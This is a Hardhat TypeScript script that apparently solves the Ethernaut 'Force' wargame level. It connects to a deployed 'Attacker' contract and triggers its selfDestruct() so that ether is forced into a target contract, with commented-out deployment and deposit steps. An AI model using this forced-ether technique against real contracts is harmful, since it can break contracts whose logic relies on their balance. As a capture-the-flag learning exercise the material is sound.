import { ethers } from "hardhat";
import { expect } from "chai";
import { anyValue } from "@nomicfoundation/hardhat-chai-matchers/withArgs";
import { any } from "hardhat/internal/core/params/argumentTypes";

const CONTRACT_ADDRESS = "0xD3a8e62a14410F3bCA078A2d7ccE422Bf0B77C48";
const PLAYER_ADDRESS = "0x81215d34367AF48d01E728AfF2976d9Df32fE604";
const ATTACKER_CONTRACT = "0x0cB1b57838C55A73859E821F9a21cda08D60232E";

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS);
  const contract = await ethers.getContractAt(
    "Force",
    CONTRACT_ADDRESS,
    signer
  );

  //Only needed for deployment
  // const attackerContractFactory = await ethers.getContractFactory(
  //   "Attacker",
  //   signer
  // );

  //Only needed for deployment
  // const attackerContract = await attackerContractFactory.deploy();

  const attackerContract = await ethers.getContractAt(
    "Attacker",
    ATTACKER_CONTRACT,
    signer
  );

  // In order to grab the contract details you can just log this
  // console.log("lets Grab the attacker contract", attackerContract);
  // const depositValue = ethers.utils.parseEther(".0005");
  // // Lets test our deposit function
  // console.log("Sending the contract some money with the deposit");
  // let depositTX = await attackerContract.depositMoney({
  //   value: depositValue,
  //   from: PLAYER_ADDRESS,
  // });
  // console.log(depositTX);
  // console.log("checking if the the contract logged the deposit");
  // await expect(attackerContract.depositMoney())
  //   .to.emit(attackerContract, "depositEmitter")
  //   .withArgs(anyValue, anyValue, anyValue);
  // console.log(
  //   "checking if the the contract self destructed and sent the money"
  // );
  await expect(attackerContract.selfDestruct())
    .to.emit(attackerContract, "selfDestructEmitter")
    .withArgs(PLAYER_ADDRESS);
  // Comment out if you don't need the attacker account
  // const attackerContract = await ethers.getContractAt(
  //   "Attacker",
  //   ATTACKER_CONTRACT,
  //   signer
  // );
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
